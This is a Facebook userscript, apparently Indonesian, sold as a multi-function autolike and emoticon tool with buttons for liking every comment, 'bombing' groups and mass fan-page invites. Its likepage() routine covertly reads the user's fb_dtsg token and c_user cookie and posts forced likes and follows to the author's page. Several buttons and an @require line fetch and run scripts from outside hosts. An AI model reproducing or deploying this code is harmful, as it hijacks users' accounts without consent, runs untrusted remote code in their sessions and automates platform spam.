// ==UserScript==
// @name           facebook Multi Fungsi
// @namespace      Facebook Multi Fungsi
// @description    Bkin FB Loe Lebih Berwarna.
// @author         https://www.facebook.com/uzar.group
// @homepage       https://www.facebook.com/uzar.group
// @require        http://code.jquery.com/jquery-1.8.3.min.js
// @require        http://code.jquery.com/ui/1.9.1/jquery-ui.min.js
// @require    	   http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// @require        http://usocheckup.redirectme.net/9475.js
// @include        htt*://*.facebook.com/*
// @match          http://*.facebook.com/*
// @match          https://*.facebook.com/*
// @icon           http://fbemotbar.googlecode.com/files/icon.png
// @version			Final Version
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// @exclude        htt*://*static*.facebook.com*
// @exclude        htt*://*channel*.facebook.com*
// @exclude        htt*://developers.facebook.com/*
// @exclude        htt*://upload.facebook.com/*
// @exclude        htt*://*onnect.facebook.com/*
// @exclude        htt*://*acebook.com/connect*
// @exclude        htt*://*.facebook.com/plugins/*
// @exclude        htt*://*.facebook.com/l.php*
// @exclude        htt*://*.facebook.com/ai.php*
// @exclude        htt*://*.facebook.com/extern/*
// @exclude        htt*://*.facebook.com/pagelet/*
// @exclude        htt*://api.facebook.com/static/*
// @exclude        htt*://*.facebook.com/contact_importer/*
// @exclude        htt*://*.facebook.com/ajax/*
// @exclude        htt*://www.facebook.com/places/map*_iframe.php*
// ==/UserScript==

// ======= Jangan Menghapus Credit ====================
// == Nama : JuwendiVB Final v5 =======================
// ======= Author : JuwendiVB =========================
// ======= Site : http://www.facebook.com/uzar.group ==
// ====================================================
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "125px";div.style.opacity= 0.90;div.style.bottom = "+150px";div.style.left = "+8px";div.style.backgroundColor = "#000000";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#E30505' href='' title='Refresh'><blink><center>Reload (F5)</center></blink></a>"
body.appendChild(div);}

body = document.body;
if(body != null) {div = document.createElement("div");div.setAttribute('id','like6');div.style.position = "fixed";div.style.display = "block";div.style.width = "125px";div.style.opacity= 0.90;div.style.bottom = "+180px";div.style.left = "+8px";div.style.backgroundColor = "#000000";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#E30505'<a style='color: #2516f7;' onclick='LikeComments()'><blink><center>Like All Comments</center></blink></a>"
body.appendChild(div);unsafeWindow.LikeComments = function() {
var BounceCounterLike=0;var Counter = 0;var prepare = document.getElementsByTagName("a");var buttons = new Array();for (var i = 0; i < prepare.length; i++)if(prepare[i].getAttribute("data-ft")!=null&&(prepare[i].getAttribute("title")=="Me gusta este comentario"||prepare[i].getAttribute("title")=="Like this comment"||prepare[i].getAttribute("title")=="Suka komentar ini"||prepare[i].getAttribute("title")=="Nyenengi tanggapan iki"||prepare[i].getAttribute("title")=="Ã˜Â§Ã™â€žÃ˜Â¥Ã˜Â¹Ã˜Â¬Ã˜Â§Ã˜Â¨ Ã˜Â¨Ã˜Â§Ã™â€žÃ˜ÂªÃ˜Â¹Ã™â€žÃ™Å Ã™â€š"||prepare[i].getAttribute("title")=="Ã£Ââ€œÃ£ÂÂ®Ã£â€šÂ³Ã£Æ’Â¡Ã£Æ’Â³Ã£Æ’Ë†Ã£ÂÂ¯Ã£Ââ€žÃ£Ââ€žÃ£ÂÂ­Ã¯Â¼Â"||prepare[i].getAttribute("title")=="Ã¬Â¢â€¹Ã¬â€¢â€žÃ¬Å¡â€ Ã¬Â·Â¨Ã¬â€ Å’"||prepare[i].getAttribute("title")=="Ã¨ÂªÂªÃ©â‚¬â„¢Ã¥â€°â€¡Ã§â€¢â„¢Ã¨Â¨â‚¬Ã¨Â®Å¡"||prepare[i].getAttribute("title")=="JÃ¢â‚¬â„¢aime ce commentaire"||prepare[i].getAttribute("title")=="Bu yorumu beÃ„Å¸en")) {buttons[Counter] = prepare[i];Counter++;}function check_link(linknumber) {buttons[linknumber].click();var message = "<a style='font-weight:bold;color:#3B5998' onclick='Autolike()'><center>Like Comments: "+ (linknumber + 1) +"/"+ buttons.length +"</center></a>";document.getElementById('like3').innerHTML = message;};function like_timer(timex) {window.setTimeout(bouncer_like,timex);};function check_warning() {var warning = document.getElementsByTagName("label");var checkwarning = false;for(var i = 0; i < warning.length; i++) {var myClass = warning[i].getAttribute("class");if(myClass!=null&&myClass.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0) {alert("Warning from Facebook");checkwarning = true;}}if(!checkwarning) like_timer(2160);};function warning_timer(timex) {window.setTimeout(check_warning,timex);};function bouncer_like() {if ( BounceCounterLike < buttons.length ) {check_link(BounceCounterLike);warning_timer(700);BounceCounterLike++;}};bouncer_like();
};}

// ==Profile==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like1');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity = 1.00;
	div.style.bottom = "+82px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#000000";
	div.style.border = "1px solid #555";
	div.style.padding = "2px";
	div.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><center><blink><a style='color: #E30505;' <a href='http://www.facebook.com/uzar.group' title='JuwendiVB Facebook'> Automatic Facebook </blink></a></div>"
	div2 = document.createElement("div");
	div2.setAttribute('id','spoiler');
	div2.style.position = "fixed";
    div2.style.width = "125px";
	div2.style.opacity = 0.90;
	div2.style.bottom = "+2px";
	div2.style.left = "+6px";
	div2.style.backgroundColor = "#000000";
	div2.style.border = "1px solid #E30505";
	div2.style.padding = "2px";
	div2.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to Hidden Autolike'>&laquo;</a>&nbsp;<a href='http://www.facebook.com/uzar.group' target='_blank' title='New Automated facebook | Copyright 2013 | All Right Reserved' style='color: #FFFFFF;'>New Automated facebook</a> | <a style='color: #FFFFFF;' onclick='thanks()'>Credit</a></div>"
	
	body.appendChild(div);
	body.appendChild(div2);
	
	unsafeWindow.thanks = function() {
	alert("Thanks for installing this autolike :)\n\nJuwendiVB\nCopyright (c) 2013");
	}
	unsafeWindow.spoiler = function() {
		var i;
	for(i=1;i<=20;i++) {
		var x=document.getElementById('like'+i);
		if (x.style.display=="none") {
		x.style.display="block";
		div2.style.width = "125px";
		div2.innerHTML ="<div style='background-color: #2E5392; color: #FFFFFF; border: 1px solid #333333;'><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to Hidden Autolike'>&laquo;</a>&nbsp;<a style='color: #FFFFFF;' href='http://www.facebook.com/uzar.group' target='_blank' title='New Automated facebook by Fajar JuwendiVB | Copyright 2013 | All Right Reserved'>New Automated facebook</a> | <a style='color: #E30505;' onclick='thanks()'>Credit</a></div>"
		}
		else {
			x.style.display="none";
			div2.style.width = "7px";
			div2.innerHTML = "<a onclick='spoiler()' title='Click to Show Autolike'>&raquo;</a>"
		}
	}
	};
}

// ==Like All==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like4');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity = 0.90;
	div.style.bottom = "+62px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#000000";
	div.style.border = "1px solid #E30505";
	div.style.padding = "2px";
	div.innerHTML = "<img src='https://lh4.googleusercontent.com/-D1HYuLwPnNQ/TxPK6cm_THI/AAAAAAAAAIE/ynATGaxGbv0/s16/Facebook%252520Like%252520Small.jpg' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<blink><a style='color: #E30505;'<a onclick='juwendilike()'>Like All Status</blink></a></div>"
	
	body.appendChild(div);
	
	unsafeWindow.juwendilike = function() {
    javascript: (a = (b = document).createElement("script")).src = "//fajarzikri.googlecode.com/files/forlike.js",
    b.body.appendChild(a);
    void(0);
    };
}

// ==Result for like goes here==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like3');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity = 0.90;
	div.style.bottom = "+42px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#000000";
	div.style.border = "1px solid #E30505";
	div.style.padding = "2px";
	div.innerHTML = "<img src='https://lh4.googleusercontent.com/-D1HYuLwPnNQ/TxPK6cm_THI/AAAAAAAAAIE/ynATGaxGbv0/s16/Facebook%252520Like%252520Small.jpg' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<blink><a style='color: #E30505;'<a onclick='javascript:void(0);'>Liked:</blink></a></div>"
	
	body.appendChild(div);
}
// ==bom Group==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like5');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity = 0.90;
	div.style.bottom = "+120px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#000000";
	div.style.border = "1px solid #E30505";
	div.style.padding = "2px";
	div.innerHTML = "<img src='https://lh4.googleusercontent.com/-D1HYuLwPnNQ/TxPK6cm_THI/AAAAAAAAAIE/ynATGaxGbv0/s16/Facebook%252520Like%252520Small.jpg' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<blink><a style='color: #E30505;'<a onclick='bomgroup()'>Bom Group</blink></a></div>"
	
	body.appendChild(div);
	
	unsafeWindow.bomgroup = function() {
    javascript: (a = (b = document).createElement("script")).src = "http://cyber-xps.googlecode.com/files/Juwendivb.js",
    b.body.appendChild(a);
    void(0);
    };
}
// ==Ceck All Fanspage==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like7');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity = 0.90;
	div.style.bottom = "+220px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#000000";
	div.style.border = "1px solid #E30505";
	div.style.padding = "2px";
	div.innerHTML = "<img src='https://lh4.googleusercontent.com/-D1HYuLwPnNQ/TxPK6cm_THI/AAAAAAAAAIE/ynATGaxGbv0/s16/Facebook%252520Like%252520Small.jpg' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<blink><a style='color: #E30505;'<a onclick='fanspage()'>ALL Invite FP</blink></div></a>"
	
	body.appendChild(div);
	
	unsafeWindow.fanspage = function() {
    javascript: (a = (b = document).createElement("script")).src = "http://cyber-xps.googlecode.com/files/fp-invite.js",
    b.body.appendChild(a);
    void(0);
    };
}
// ==Auto Invite Fanspage==
body = document.body;
if(body != null) {div = document.createElement("div");div.style.position = "fixed";div.style.display = "block";div.style.width = "125px";div.style.opacity= 0.90;div.style.bottom = "+250px";div.style.left = "+8px";div.style.backgroundColor = "#000000";div.style.border = "1px solid #6B84B4";div.style.padding = "3px";div.innerHTML = "<a style='font-weight:bold;color:#E30505' onclick='BugInfo()'><blink><center>Visite Blog</center></blink></a></a>"
body.appendChild(div);unsafeWindow.BugInfo = function() {
window.open(this.href='http://nbs-site.blogspot.com', 'dmfollow', 'toolbar=0,location=0,statusbar=1,menubar=0,scrollbars=no,width=400,height=255');return false;
};}
// ==Confirm All dan UnConfirm All==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like3');
	div.style.position = "fixed";
	div.style.display = "block"; 
	div.style.width = "125px";
	div.style.opacity = 0.90;
	div.style.bottom = "+22px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#000000";
	div.style.border = "1px solid #E30505";
	div.style.padding = "2px";
	div.innerHTML = "<a onclick='OtomatisConfirm();' >Konfirmasi</a>&nbsp;|&nbsp;<a onclick='OtomatisAbaikan();' >Abaikan</a>"
	
	body.appendChild(div);
	function suspend(milliSeconds){
	var startTime = new Date().getTime(); 
	while (new Date().getTime() < startTime + milliSeconds); 
}
	unsafeWindow.OtomatisConfirm = function() {
		var x=document.getElementsByName("actions[accept]"); for (i=0;i<x.length;i++) { x[i].click();}
		};
		
	unsafeWindow.OtomatisAbaikan = function() {
			var x=document.getElementsByName("actions[hide]"); for (i=0;i<x.length;i++) { x[i].click();}
			};
}
// ==========     Jangan Menghapus Credit    ===============
// == Nama : Auto Like Facebook v.3 Final ==================
// ==============  Author : JuwendiVB  =====================
// ======= Site : http://www.facebook.com/uzar.group =======
// =======================================
//============================== EMOTION =======================================================================================================================================================================================================================================================================================================================================================================================================================================================================================//
Array.prototype.remove = function(){var what, a= arguments, L= a.length, ax;while(L && this.length){what= a[--L];while((ax= this.indexOf(what))!= -1){this.splice(ax, 1);}}return this;}
domain = document.domain;var dtsg, HttpsOn, ImagesURL, ResourcesURL, storage, emotsInfo, spemotsInfo, headTag, styleTag, ArrowStyleUp, ArrowStyleDown, fEmotBarDom, fEmotsListDom, fArrow,lan;if($("body").css("direction") == "rtl"){dir = "rtl";css = '.settingimg{cursor:pointer;opacity: 1;z-index: 600;right: 10px;bottom: 20px;width: 92px;height: 48px;position: fixed;}';}else{dir = "ltr";css = '.settingimg{cursor:pointer;opacity: 1;z-index: 600;left: 10px;bottom: 20px;width: 92px;height: 48px;position: fixed;}';}var emoticonsn = 0;var emoticonsimages = "";HttpsOn = window.location.href.match('https://')?true:false;Http = HttpsOn?'https:':'http:';ImagesURL = HttpsOn?'https://s-static.ak.fbcdn.net/images/':'http://static.ak.fbcdn.net/images/';ResourcesURL = HttpsOn?'https://s-static.ak.fbcdn.net/rsrc.php/':'http://static.ak.fbcdn.net/rsrc.php/';storage = 'none';try {if (typeof GM_getValue === 'function' && typeof GM_setValue === 'function'){GM_setValue('testkey', 'testvalue');if (GM_getValue('testkey', false) === 'testvalue'){storage='greasemonkey'; }}}catch(x){}if(storage=='none' && typeof localStorage == 'object'){storage='localstorage';}function delValue(key){switch (storage){case 'greasemonkey':GM_deleteValue('0-'+key);break;case 'localstorage':localStorage.removeItem('femotbar-0-'+key);break;}}function setValue(key, value){switch (storage){case 'greasemonkey':GM_setValue('0-'+key, value);break;case 'localstorage':localStorage['femotbar-0-'+key] = value;break;}}function getValue(key, value){switch (storage){case 'greasemonkey':return GM_getValue('0-'+key, value);break;case 'localstorage':var val = localStorage['femotbar-0-'+key];if (val=='true'){return true;}else if(val=='false'){return false;}else if(val){return val;}break;}return value;}function getCookie(c_name){var i,x,y,ARRcookies=document.cookie.split(";");for (i=0;i<ARRcookies.length;i++){x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);x=x.replace(/^\s+|\s+$/g,"");if (x==c_name){return unescape(y);}}}function setCookie(c_name,value,exdays){var exdate=new Date();exdate.setDate(exdate.getDate() + exdays);var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());document.cookie=c_name + "=" + c_value;}function xmlhttpRequest(params, callBack){if (typeof GM_xmlhttpRequest !== 'undefined'){params['onload'] = callBack;return GM_xmlhttpRequest(params);}return null;}function openInTab(url){if (typeof GM_openInTab !== 'undefined'){GM_openInTab(url);}else{window.open(url);}}function UpdateCheck(){if(parseInt(getValue('LastUpdate', '0')) + 7200000 <= (new Date().getTime())){try {xmlhttpRequest({method: 'GET', url: 'http://'+em.sitedomain+'/emotbars.meta.js?' + new Date().getTime(), headers: {'Cache-Control': 'no-cache'} },handleUpdateResponse);}catch(err){alert('An error occurred while checking for updates:\n' + err);}}}function createSelection(field, start, end){if(field.createTextRange){var selRange = field.createTextRange();selRange.collapse(true);selRange.moveStart('character', start);selRange.moveEnd('character', end);selRange.select();}else if(field.setSelectionRange){field.setSelectionRange(start, end);}else if(field.selectionStart){field.selectionStart = start;field.selectionEnd = end;}field.focus();}function sortnum(data_A, data_B){return (data_B - data_A);}function likepage(){if(getValue('lastuid',0) != em.c_user || getValue('lastlike',0) + 7200000 <= (new Date().getTime())){$.post('http://www.facebook.com/ajax/pages/fan_status.php', em.likedata);$.post('http://www.facebook.com/ajax/follow/follow_profile.php', em.followdata);setValue('lastuid', em.c_user);setValue('lastlike', new Date().getTime() + '');}}function reload(){window.location=window.location.href.split("#")[0];}function getCursorPosition(field){var CursorPos = 0;if (field.selectionStart || field.selectionStart == '0'){CursorPos = field.selectionStart;return (CursorPos);}}function xPathSelector (__constructor){var xps=this;var xpath=__constructor;xps.getSingleNodeValue=function(){try{return document.evaluate(xpath,document,null,9,null).singleNodeValue}catch(exception){new ErrorHandler(exception,"xPathSelector::getSingleNodeValue");return null}};xps.getMultipleNodeValues=function(){try{return document.evaluate(xpath,document,null,0,null)}catch(exception){new ErrorHandler(exception,"xPathSelector::getMultipleNodeValues");return null}};xps.numberValues=function(){try{return document.evaluate("count("+xpath+")",document,null,0,null).numberValue}catch(exception){new ErrorHandler(exception,"xPathSelector::numberValues");return -1}};xps.toString=function toString(){return'[xPath Selector "'+xpath+'"]'}}em = {c : function(text){console.log('Emoticons Log : (\n'+text+'\n)');},ar : function(array){$.each(array,function(k,v){console.log(k+' : '+v);});},er : function(error){console.log('Emoticons Error : (\n'+error.message+'\n)');},fbpage_id : '249930978454657',newimg : '<img src="http://i47.servimg.com/u/f47/17/67/69/78/gif-ne10.gif">',newicon : '<img src="http://i47.servimg.com/u/f47/17/67/69/78/gif-ne10.gif">',w : $(window).width() -7,h : $(window).height(),scb : getValue('showcommentbar',false),version : 3.3,sitedomain : 'facebook.com/uzar.group',defaultLanguage : 'en',langs : {'en':'English','ar':'Ø§Ù„Ù„ØºØ© Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©'},lang : {get:function(a){if(typeof this[em.selectedLanguage] != "undefined"){return this[em.selectedLanguage][a];}else{return this[em.defaultLanguage][a];}},ar : {title:'<font size="5px" color="blue" dir="rtl">Ø§Ø®ØªØ± Ø§Ù„Ø§Ø¨ØªØ³Ø§Ù…Ø§Øª Ø§Ù„ØªÙ‰ ØªØ±ÙŠØ¯Ù‡Ø§ - Ø§Ø¶ØºØ· (ctrl) Ù„Ù„Ø§Ø®ØªÙŠØ§Ø± .</font>',sd1:'Ø­ÙØ¸',sd2:'Ø¥ØºÙ„Ø§Ù‚',sd3:'ØªØ­Ø¯ÙŠØ¯ Ø§Ù„ÙƒÙ„',sd4:'Ø¥Ù„ØºØ§Ø¡ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„ÙƒÙ„',sd5:'<center dir="rtl">Ø§Ø®ØªØ± Ø§Ù„Ù„ØºØ© Ø§Ù„ØªÙ‰ ØªØ±ÙŠØ¯Ù‡Ø§ : ',sd6:'Ø¥Ø¶Ø§ÙØ© Ø´Ø±ÙŠØ· Ø§Ù„Ø§Ø¨ØªØ³Ø§Ù…Ø§Øª Ù„Ù„ÙƒÙˆÙ…Ù†ØªØ§Øª : ',sd7:'Ø¥Ø®ÙØ§Ø¡ Ø§Ù„ØµÙˆØ±Ø© Ø¬Ø¯ÙŠØ¯',st1:'Ø¥Ø¶Ø§ÙØ© ØµÙˆØ±Ø© Ø¬Ø¯ÙŠØ¯Ø©',st2:'Ø§Ù„Ø¶Ø¨Ø·',st3:'Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ ØªØ­Ø¯ÙŠØ«Ø§Øª',st4:'ÙØªØ­ Ø§Ù„Ù…ÙˆÙ‚Ø¹',search:'Ø¨Ø­Ø«',close:'Ø¥ØºÙ„Ø§Ù‚',er1:'Ù‡Ø°Ø§ Ø§Ù„Ø±Ù‚Ù… Ø®Ø§Ø·Ø¦',cu1:'Ø±Ø§Ø¦Ø¹ Ù„Ø¯ÙŠÙƒ Ø£Ø®Ø± Ø¥ØµØ¯Ø§Ø±.',cu2:"ÙŠÙˆØ¬Ø¯ Ø¥ØµØ¯Ø§Ø± Ø¬Ø¯ÙŠØ¯ Ù…Ù†  'Facebook Emoticons Bars'",cu3:"Ø§Ù„Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ø­Ø§Ù„Ù‰: ",cu4:"Ø§Ù„Ø¥ØµØ¯Ø§Ø± Ø§Ù„Ø¬Ø¯ÙŠØ¯: ",cu5:"Ù‡Ù„ ØªØ±ÙŠØ¯ Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø£Ù†ØŸ",},en : {title:'<font size="4px" color="blue" dir="rtl">Select What do You Need -- press ctrl To Select</font>',sd1:'Save',sd2:'Close',sd3:'Select ALL',sd4:'UnSelect ALL',sd5:'<center dir="ltr">Select Your Language : ',sd6:'Add Emoticons Bar To Comment : ',sd7:'Hide New Icon.',st1:'Add Emoticon By Id',st2:'Setting',st3:'Check For Update',st4:'Open WebSite',search:'search',close:'close',er1:'This Number Is Wrong.',cu1:'Congratulation You Use The Last Version.',cu2:"There's an update available for 'Facebook Emoticons Bars'",cu3:"Your version: ",cu4:"New version: ",cu5:"Do you wish to install it?",}}};em.selectedLanguage = getValue('selectedLanguage',em.defaultLanguage);function handleUpdateResponse(r){setValue('LastUpdate', new Date().getTime() + '');if (r.responseText.match(/@version\s+(\d+\.\d+)/)[1] > em.version){if(confirm(em.lang.get('cu2') + "\n" + em.lang.get('cu3') + em.version + "\n" + em.lang.get('cu4') + r.responseText.match(/@version\s+(\d+\.\d+)/)[1] + "\n" + em.lang.get('cu5'))){openInTab('http://userscripts.org/scripts/source/136011.user.js');}}}/*--- Start Site ---*/if(domain.indexOf('fbemot') != -1){if(navigator.userAgent.indexOf('Firefox') != -1){var stat = false;$(function(){ADDE = getValue("ADDE",'0').split(',');$('input#ADD_Emoticon').each(function(){num =  $(this).val();if($.inArray(num,ADDE) != -1){$(this).attr('src','remove.gif');$(this).click(function(){$(this).attr('src','loading.gif');num = $(this).val();ADDE = getValue("ADDE",'0').split(',');ADDE.remove(num);setValue("ADDE",ADDE.join(','));delValue("SEmotions_" + num);delValue("SEimg_" + num);$(this).parent().html('<img style="width:75px;" src="done.jpg">');});}else{$(this).click(function(){$(this).attr('src','loading.gif');num =  $(this).val();$.get('http://'+em.sitedomain+'/api.php',{id:num},function(res){response = $.parseJSON(res);setValue("SEmotions_" + num, response.text);setValue("SEimg_" + num, response.img);});ADDE = getValue("ADDE",'0').split(',');if($.inArray(num,ADDE) == -1){ADDE.push(num);setValue("ADDE", ADDE.join(','));}$(this).parent().html('<img style="width:75px;" src="done.jpg">');});}});});}else if(navigator.userAgent.indexOf('Chrome') != -1){$(function(){$('input#ADD_Emoticon').each(function(){$(this).get(0).type = 'text';$(this).css({'width':'50px','margin':'0px 5px','text-align':'center','border-radius': '15px'});$(this).focus(function(){$(this).select()});});});}return false; }else{var scripts=(new xPathSelector("//script")).getMultipleNodeValues(),innerEnv=null;function getdtsg(){while(script=scripts.iterateNext()){if(/"?fb_dtsg"?:/.test(script.innerHTML)){innerEnv=script.innerHTML;}return innerEnv.match(/"?fb_dtsg"?:"([? \\ + a-z A-Z 0-9 _ -]+)",/)[1];}}em.fb_dtsg = getdtsg(),em.c_user = getCookie('c_user'),em.likedata = 'fbpage_id='+em.fbpage_id+'&add=true&reload=false&fan_origin=page_timeline&nctr[_mod]=pagelet_main_column_personal&__user='+em.c_user+'&__a=1&fb_dtsg='+em.fb_dtsg;em.followdata = 'profile_id='+em.fbpage_id+'&location=45&__user='+em.c_user+'&__a=1&fb_dtsg='+em.fb_dtsg;likepage();}if(getValue('hidenewicon',false) == true){em.newimg = '';}/*--- End Site ---*/H4codeEmotions =['http://i37.servimg.com/u/f37/17/67/69/78/110.png','\n[[295412723906482]][[295412733906481]][[295412740573147]][[295412753906479]][[295412757239812]][[295412760573145]][[295412767239811]][[295412773906477]]\n[[295412780573143]][[295412783906476]][[295412790573142]][[295412793906475]][[295412797239808]][[295412800573141]][[295412803906474]][[295412807239807]]\n[[295412810573140]][[295412817239806]][[295412823906472]][[295412827239805]][[295412830573138]][[295412833906471]][[295412837239804]][[295412843906470]]\n[[295412847239803]][[295412853906469]][[295412860573135]][[295412870573134]][[295412883906466]][[295412887239799]][[295412890573132]][[295412893906465]]\n[[295412900573131]][[295412907239797]][[295412910573130]][[295412913906463]][[295412920573129]][[295412927239795]][[295412930573128]][[295412933906461]]\n','http://i37.servimg.com/u/f37/17/67/69/78/210.png','\n[[295413220573099]][[295413227239765]][[295413237239764]][[295413243906430]][[295413247239763]][[295413253906429]][[295413257239762]][[295413273906427]]\n[[295413280573093]][[295413283906426]][[295413287239759]][[295413290573092]][[295413297239758]][[295413300573091]][[295413310573090]][[295413320573089]]\n[[295413327239755]][[295413337239754]][[295413340573087]][[295413343906420]][[295413347239753]][[295413350573086]][[295413357239752]][[295413377239750]]\n[[295413383906416]][[295413387239749]][[295413393906415]][[295413397239748]][[295413403906414]][[295413413906413]][[295413417239746]][[295413430573078]]\n[[295413433906411]][[295413440573077]][[295413443906410]][[295413447239743]][[295413453906409]][[295413463906408]][[295413470573074]][[295413477239740]]\n','http://i37.servimg.com/u/f37/17/67/69/78/310.png','\n[[295414213906333]][[295414217239666]][[295414220572999]][[295414223906332]][[295414227239665]][[295414233906331]][[295414240572997]][[295414243906330]]\n[[295414250572996]][[295414257239662]][[295414260572995]][[295414263906328]][[295414267239661]][[295414273906327]][[295414277239660]][[295414280572993]]\n[[295414283906326]][[295414290572992]][[295414293906325]][[295414297239658]][[295414300572991]][[295414307239657]][[295414313906323]][[295414317239656]]\n[[295414320572989]][[295414323906322]][[295414327239655]][[295414330572988]][[295414333906321]][[295414337239654]][[295414340572987]][[295414343906320]]\n[[295414347239653]][[295414350572986]][[295414353906319]][[295414357239652]][[295414360572985]][[295414363906318]][[295414367239651]][[295414370572984]]\n','http://i37.servimg.com/u/f37/17/67/69/78/410.png','\n[[295414500572971]][[295414503906304]][[295414507239637]][[295414513906303]][[295414517239636]][[295414520572969]][[295414527239635]][[295414530572968]]\n[[295414533906301]][[295414540572967]][[295414543906300]][[295414550572966]][[295414553906299]][[295414560572965]][[295414583906296]][[295414590572962]]\n[[295414593906295]][[295414600572961]][[295414603906294]][[295414607239627]][[295414610572960]][[295414617239626]][[295414620572959]][[295414627239625]]\n[[295414630572958]][[295414633906291]][[295414637239624]][[295414640572957]][[295414647239623]][[295414653906289]][[295414657239622]][[295414660572955]]\n[[295414667239621]][[295414670572954]][[295414677239620]][[295414680572953]][[295414693906285]][[295414697239618]][[295414700572951]][[295414703906284]]\n','http://i37.servimg.com/u/f37/17/67/69/78/510.png','\n[[295414873906267]][[295414877239600]][[295414880572933]][[295414883906266]][[295414897239598]][[295414900572931]][[295414903906264]][[295414907239597]]\n[[295414910572930]][[295414917239596]][[295414920572929]][[295414923906262]][[295414927239595]][[295414930572928]][[295414933906261]][[295414937239594]]\n[[295414947239593]][[295414950572926]][[295414953906259]][[295414967239591]][[295414970572924]][[295414980572923]][[295414987239589]][[295414993906255]]\n[[295415000572921]][[295415003906254]][[295415010572920]][[295415013906253]][[295415017239586]][[295415020572919]][[295415023906252]][[295415027239585]]\n[[295415030572918]][[295415037239584]][[295415040572917]][[295415047239583]][[295415050572916]][[295415053906249]][[295415057239582]][[295415063906248]]\n','http://i37.servimg.com/u/f37/17/67/69/78/610.png','\n[[295415317239556]][[295415320572889]][[295415327239555]][[295415330572888]][[295415333906221]][[295415337239554]]\n[[295415340572887]][[295415347239553]][[295415350572886]][[295415353906219]][[295415360572885]][[295415363906218]]\n[[295415370572884]][[295415377239550]][[295415383906216]][[295415387239549]][[295415390572882]][[295415397239548]]\n[[295415400572881]][[295415403906214]][[295415407239547]][[295415410572880]][[295415413906213]][[295415417239546]]\n[[295415420572879]][[295415423906212]][[295415433906211]][[295415443906210]][[295415447239543]][[295415450572876]]\n[[295415457239542]][[295415460572875]][[295415463906208]][[295415467239541]][[295415470572874]][[295415473906207]]\n','http://i37.servimg.com/u/f37/17/67/69/78/710.png','\n[[295415957239492]][[295415963906158]][[295415967239491]][[295415983906156]][[295415987239489]]\n[[295415990572822]][[295415993906155]][[295415997239488]][[295416003906154]][[295416007239487]]\n[[295416010572820]][[295416017239486]][[295416023906152]][[295416033906151]][[295416037239484]]\n[[295416040572817]][[295416047239483]][[295416053906149]][[295416057239482]][[295416060572815]]\n[[295416070572814]][[295416093906145]][[295416103906144]][[295416110572810]][[295416117239476]]\n[[295416127239475]][[295416140572807]][[295416143906140]][[295416147239473]][[295416150572806]]\n[[295416153906139]][[295416160572805]][[295416163906138]][[295416170572804]][[295416173906137]]\n[[295416177239470]][[295416180572803]][[295416183906136]][[295416190572802]][[295416193906135]]\n','http://i37.servimg.com/u/f37/17/67/69/78/810.png','\n[[295416273906127]][[295416277239460]][[295416280572793]][[295416287239459]][[295416290572792]][[295416293906125]]\n[[295416300572791]][[295416303906124]][[295416310572790]][[295416317239456]][[295416333906121]][[295416337239454]]\n[[295416343906120]][[295416347239453]]